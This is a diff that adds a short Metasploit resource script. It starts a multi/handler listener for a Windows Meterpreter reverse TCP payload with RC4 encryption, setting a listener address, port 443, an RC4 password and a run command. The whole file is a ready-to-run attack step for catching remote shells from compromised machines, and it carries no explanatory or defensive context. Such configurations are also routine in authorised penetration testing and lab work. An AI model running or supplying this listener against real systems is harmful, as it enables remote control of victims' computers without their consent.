@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp_rc4
+set LHOST 192.168.1.24
+set LPORT 443
+set RC4PASSWORD GeekIsChic
+run
